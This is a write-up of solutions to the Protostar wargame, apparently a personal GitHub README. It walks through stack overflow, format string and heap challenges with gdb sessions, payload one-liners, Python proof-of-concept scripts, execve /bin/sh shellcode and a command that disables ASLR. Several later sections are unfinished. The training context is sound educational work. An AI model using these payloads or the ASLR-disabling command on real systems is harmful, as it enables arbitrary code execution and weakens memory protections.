# protostar
protostar sploits and solutions 
https://exploit-exercises.com/protostar

NOTE: write ups in progress. Adding python exploit poc's to each excercise for practice!

##INDEX

| Challenge                        |
| :------------------------------- | 
| [Stack0](#stack0) | 
|[Stack1](#stack1)|
|[Stack2](#stack2)|
|[Stack3](#stack3)|
|[Stack4](#stack4)|
|[Stack5](#stack5)|
|[Format0](#format0)|
|[Format1](#format1)|
|[Format2](#format2)|
|[Heap0](#Heap0)|
|[Heap1](#Heap1)|





#Stack0
---------------------------------------
###Source Code:
```C
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
###Stack:

| eip | ebp | modified(0) |   buffer    |

###The plan:
fill buffer with gets 
since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modified

###winning command:
```bash
python -c "print 'a'*64+'1'" | ./stack0
```
###Python exploit:
```Python
from subprocess import Popen, PIPE
################
buffer = 64 
fill = "A"*buffer  
input=fill+"1"      
#################
cproc = Popen("./stack0", stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)[0]   
```
        
        
        
        
        

#Stack1
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
###Stack:
| eip | ebp | modified(0) |   buffer    |

###Plan:
This challenge is similar to the last one with a few differences.  It takes command line args instead of gets, and instead of setting modified to 1, we need to set it to 0x61626364 ("abcd" in ascii). Like the previous challenge, we just fill up buffer and overflow the correct value into modified. Since it's little endian, we need to craft our input so that the value sits in memory correctly. 

###winning command:
```bash
./stack1 $(python -c "print 'a'*64+'dcba'")
```
###Python exploit:
```Python
from subprocess import Popen, PIPE
################
buffer = 64
fill = "A"*buffer
input=fill+'\x64\x63\x62\x61'
#################
cproc = Popen(["./stack1",input], stdin=PIPE, stdout=PIPE)
print cproc.communicate()[0]
```




#Stack2
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
###Stack:
| eip | ebp | modified(0) |   buffer    | variable pointer|

###Plan:
Use an environment variable to overflow buffer via strcpy and fill modified with correct value.

###winning command:
```bash

```
###Python exploit:
```Python
from subprocess import Popen, PIPE
import os
################
buffer = 64
fill = "A"*buffer
input=fill+'\x0a\x0d\x0a\x0d'
print(input)
os.environ ["GREENIE"]=input
#################
cproc = Popen("./stack2", stdin=PIPE, stdout=PIPE)
print cproc.communicate()[0]
```





#Stack3
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
###Stack:
| eip | ebp | fp(0) |   buffer  |

###Plan:
Another overflow. This time we need to use objdump/gdb to find the memory location of the win function. There are a few ways to accomplish this, so I will cover two.
####Objdump
run the following to generate your assembly:
```bash
objdump -d ./stack2 | ./stack2.s
```
after reviewing your assembly, you can see the following
```asm
08048424 <win>:
 8048424:	55                   	push   %ebp
 8048425:	89 e5                	mov    %esp,%ebp
 8048427:	83 ec 18             	sub    $0x18,%esp
 804842a:	c7 04 24 40 85 04 08 	movl   $0x8048540,(%esp)
 8048431:	e8 2a ff ff ff       	call   8048360 <puts@plt>
 8048436:	c9                   	leave  
 8048437:	c3                   	ret   
```
####gdb
use the following command in gdb to print the memory location of win
```
x win
```

we now know win is at 0x08048424 in memory, so we craft an input that overflows into fp with this location (adjusted for endianess) 
###winning command:
```bash
python -c "print 'a'*64+'\x24\x84\x04\x08'" | ./stack3 
```
###Python exploit:
```Python
from subprocess import Popen, PIPE
import os
################
buffer = 64
fill = "A"*buffer
input=fill+'\x24\x84\x04\x08' #08048424
print(input)
#################
cproc = Popen("./stack3", stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)[0]
```






#Stack4
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
###Stack:
| eip | ebp |   buffer  |

###Plan:
Another overflow. This time we need to use objdump/gdb to find the memory location of the win function, then we want to overwrite EIP so that we return to win.
First we find where we need to jump with gdb.
```
$ gdb ./stack4
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Reading symbols from ./stack4...done.
(gdb) x win
0x80483f4 <win>:        0x83e58955
```
By looking at the source code, you might assume that we simply need to fill buffer(64bytes), which will then overflow into EBP(4bytes) and then the next bytes of our input would overwrite EIP. We could try something like this
```bash
python -c "print (68*'a')+'\xf4\x83\x04\x08'" | ./stack4
```
This does not work, and it's because (as the hint says) compilers behavior isnt always apparent.
So lets fire up GDB
```bash
$ gdb ./stack4
Reading symbols from ./stack4...done.
(gdb) disas main   
Dump of assembler code for function main:
   0x08048408 <+0>:     push   %ebp
   0x08048409 <+1>:     mov    %esp,%ebp
   0x0804840b <+3>:     and    $0xfffffff0,%esp
   0x0804840e <+6>:     sub    $0x50,%esp
   0x08048411 <+9>:     lea    0x10(%esp),%eax
   0x08048415 <+13>:    mov    %eax,(%esp)
   0x08048418 <+16>:    call   0x804830c <gets@plt>
   0x0804841d <+21>:    leave                                  #<--- set a break here, right after gets loads buffer with data
   0x0804841e <+22>:    ret    
End of assembler dump.
(gdb) b *0x0804841d                                           #set breakpoint 
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) run
Starting program: /home/ubuntu/workspace/proto/stack4 
aaaaaaaaaaaaaaaaaaaaaaaaaaa                                   #run with some garbage data

Breakpoint 1, main (argc=1, argv=0xffffd1c4) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
(gdb) x/40wx $esp                                              #lets check out our stack 
0xffffd0d0:     0xffffd0e0      0xffffd0fe      0xf7e25bf8      0xf7e4c273
0xffffd0e0:     0x61616161      0x61616161      0x61616161      0x61616161 #<--- we can see our input starts here
0xffffd0f0:     0x61616161      0x61616161      0x00616161      0x08048449
0xffffd100:     0x08048430      0x08048340      0x00000000      0xf7e4c42d
0xffffd110:     0xf7fc33c4      0xf7ffd000      0x0804843b      0xf7fc3000
0xffffd120:     0x08048430      0x00000000      0x00000000      0xf7e32a83  #<--- EIP
0xffffd130:     0x00000001      0xffffd1c4      0xffffd1cc      0xf7feacea
0xffffd140:     0x00000001      0xffffd1c4      0xffffd164      0x08049600
0xffffd150:     0x08048218      0xf7fc3000      0x00000000      0x00000000
0xffffd160:     0x00000000      0xebc5d5ee      0xd23331fe      0x00000000
(gdb) p $ebp                                                   #find where EBP is, since EIP is right next to this
$1 = (void *) 0xffffd128
(gdb) p 0xffffd12c - 0xffffd0e0                                #get the offset by subtracting start of input from EIP location                                                                                                                                                          
$2 = 76                            
(gdb) 
```
Now we know the offset is actually 76 so we can craft an input and test
```bash
$ python -c "print 'a'*76+'aaaa'" | ./stack4                                                                                                            
Segmentation fault
```

Good sign! Now we replace 'aaaa' with our target location(win) which was at 080483f4.
```bash
$ python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
code flow successfully changed
Segmentation fault
```
We could probably get rid of the segfault but we wont worry about that now

###winning command:
```bash
python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
```
###Python exploit:  (BROKEN, need to figure out why popen isnt working)
```Python
from subprocess import Popen, PIPE
import os
################
input=(0x4c*'a')+'\xf4\x83\x04\x08'

print(input)
#################

cproc = Popen(["./stack4"], stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)
```



##Stack5
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
###Stack:
| eip | ebp |  buffer    |

###Plan:
Simple overflow, but this time we need to get some shellcode to run. 
Objectives:
-figure out where input starts in memory
-determine EIP location to overwrite 
-craft input that fills memory with shellcode and overwrites EIP so that our program returns to the shellcode location and executes.

NOTES: this is the first exercise where ASLR will mess up your exploit because every time the program executes, the location that your shellcode sits in memory will change. Use the following command:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Next, fire up GDB

```bash
$ gdb ./stack5
Reading symbols from ./stack5...done.
gdb$ disas main
Dump of assembler code for function main:
   0x080483c4 <+0>:     push   %ebp
   0x080483c5 <+1>:     mov    %esp,%ebp
   0x080483c7 <+3>:     and    $0xfffffff0,%esp
   0x080483ca <+6>:     sub    $0x50,%esp
   0x080483cd <+9>:     lea    0x10(%esp),%eax
   0x080483d1 <+13>:    mov    %eax,(%esp)
   0x080483d4 <+16>:    call   0x80482e8 <gets@plt>
   0x080483d9 <+21>:    leave  
   0x080483da <+22>:    ret    
End of assembler dump.

gdb$ b *0x080483d9                                                              #break right after gets
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
gdb$ run
Starting program: /home/ubuntu/exploit-exercises-pwntools/protostar/stack5 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                                     #give some input

Breakpoint 1, main (argc=0x1, argv=0xffffd6c4) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
gdb$ x/40wx $esp
0xffffd5d0:     0xffffd5e0      0xffffd5fe      0xf7e23c34      0xf7e49fe3
0xffffd5e0:     0x61616161      0x61616161      0x61616161      0x61616161    #< we see where the input begins
0xffffd5f0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd600:     0x61616161      0x61616161      0x00616161      0xf7e4a19d
0xffffd610:     0xf7fbe3c4      0xf7ffd000      0x080483fb      0xf7fbe000
0xffffd620:     0x080483f0      0x00000000      0x00000000      0xf7e30ad3
0xffffd630:     0x00000001      0xffffd6c4      0xffffd6cc      0xf7feacca
0xffffd640:     0x00000001      0xffffd6c4      0xffffd664      0x080495a0
0xffffd650:     0x08048204      0xf7fbe000      0x00000000      0x00000000
0xffffd660:     0x00000000      0x91b2c852      0xa80b8c42      0x00000000
gdb$ p $ebp
$1 = (void *) 0xffffd628                                                    #get ebp and add 4 to get EIP
gdb$ p $1+4
$2 = (void *) 0xffffd62c
gdb$ p $2 - 0xffffd5e0                                                      #subtract the mem location where our input starts
$3 = (void *) 0x4c                                                          #from EIP location to get our offset  (0x4c)
gdb$ 
```

So now we have our locations and our offset. Time to craft an input. I used http://shell-storm.org/shellcode/ to find some shellcode to use. I settled on http://shell-storm.org/shellcode/files/shellcode-811.php for this example, which is a basic 28byte execve(bin/sh) command. 

For our input, we'll put our shellcode + filler + target return location
```bash
python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'"  > testme
```
Now we test with GDB
```bash
$ gdb ./stack5
Reading symbols from ./stack5...done.
gdb$ b *0x080483d9
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
gdb$ run < testme 
Breakpoint 1, main (argc=0x0, argv=0xffffd6c4) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
gdb$ x/40wx $esp
0xffffd5d0:     0xffffd5e0      0xffffd5fe      0xf7e23c34      0xf7e49fe3
0xffffd5e0:     0x6850c031      0x68732f2f      0x69622f68      0x89e3896e   #shell code is in place
0xffffd5f0:     0xb0c289c1      0x3180cd0b      0x80cd40c0      0x61616161
0xffffd600:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd610:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd620:     0x61616161      0x61616161      0x61616161      0xffffd5e0   #return looks good
0xffffd630:     0x00000000      0xffffd6c4      0xffffd6cc      0xf7feacca
0xffffd640:     0x00000001      0xffffd6c4      0xffffd664      0x080495a0
0xffffd650:     0x08048204      0xf7fbe000      0x00000000      0x00000000
0xffffd660:     0x00000000      0xd40c28cd      0xedb56cdd      0x00000000

gdb$ c
Continuing.
process 31143 is executing new program: /bin/dash                           #boom
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80483d9

```
Great! So our exploit works in GDB, lets try it outside of the debugger--

```bash
python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'" | ./stack5                                                                                                                                                                                                  
Illegal instruction (core dumped)   #not so fast!
``` 
So what happened? Well, there are some differences in how the program runs when you run it normally and within GDB (guessing due to env variables, a wrapper will also fix this ). 
So we will take a look at the core dump to see what's going on and see where exactly everything sits in memory when a user runs the program.
First run the following command to allow core dumps to be saved
```bash
ulimit -c unlimited 
```
Now we can get into how to examine core dumps with gdb!
```bash
$ python -c "print 'a'*76+'xxxx'" | ./stack5
Segmentation fault (core dumped)
$ gdb ./stack5 core -q
warning: ~/.gdbinit.local: No such file or directory
Reading symbols from ./stack5...done.
[New LWP 31596]
Core was generated by `./stack5'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x78787878 in ?? ()
gdb$ x/60wx 0xffffd5e0
0xffffd5e0:     0x08048204      0xf7fbe000      0xf7fbec20      0xf7e7b506
0xffffd5f0:     0xf7fbec20      0xffffd641      0x7fffffff      0x0000000a
0xffffd600:     0x00000000      0xf7fbe000      0x00000000      0x00000000
0xffffd610:     0xffffd688      0xf7ff04c0      0xf7e7b449      0xf7fbe000
0xffffd620:     0x00000000      0x00000000      0xffffd688      0x080483d9
0xffffd630:     0xffffd640      0xffffd65e      0xf7e23c34      0xf7e49fe3
0xffffd640:     0x61616161      0x61616161      0x61616161      0x61616161 #< we can see the location changed
0xffffd650:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd660:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd670:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd680:     0x61616161      0x61616161      0x61616161      0x78787878  ##< return
0xffffd690:     0x00000000      0xffffd724      0xffffd72c      0xf7feacca
0xffffd6a0:     0x00000001      0xffffd724      0xffffd6c4      0x080495a0
0xffffd6b0:     0x08048204      0xf7fbe000      0x00000000      0x00000000
0xffffd6c0:     0x00000000      0xa9142257      0x90ac2647      0x00000000
```
So we alter our input with the new memory locations, and come up with an input like this:
```bash
$ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
```
Now for some weirdness . I was stuck for a while on this part, because if you run 
```bash
$ cat stack5sploit | ./stack5
$ 
```
We're getting our shell , but it exits immediately. After some research, I found a few solutions. Apparently shell redirection "<"
appends an EOF after redirecting payload5.
You can choose a different shellcode, or use the following trick. (thanks http://www.kroosec.com/2012/12/protostar-stack5.html)
```bash
(cat stack5sploit; cat) | ./stack5
```
###winning command:
```bash
$ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
(cat stack5sploit; cat) | ./stack5
```




##Format0
---------------------------------------
###Source Code:
```C

```

###Plan:


###winning command:
```bash
./format0 $(python -c "print '%64d'+'\xef\xbe\xad\xde'")
```
###Python exploit:
```Python
```

##Format1
---------------------------------------
###Source Code:
```C

```

###Plan:


###winning command:
```bash
./format1 $(python -c 'print "\x38\x96\x04\x08"+"aaaaaaaaaa"+"%127$n"')
```
###Python exploit:
```Python
```


##Format2
---------------------------------------
###Source Code:
```C

```

###Plan:


###winning command:
```bash
python -c 'print "\xe4\x96\x04\x08"+"%59x."+"%4$n"' | ./format2
```
###Python exploit:
```Python
```


##Heap1
---------------------------------------
###Source Code:
```C

```

###Plan:


###winning command:
```bash
./heap1 $(python -c "print 'a'*20+'\x2c\xd6\xff\xff'") $(python -c "print '\x94\x84\x04\x08'") 
```
###Python exploit:
```Python
```
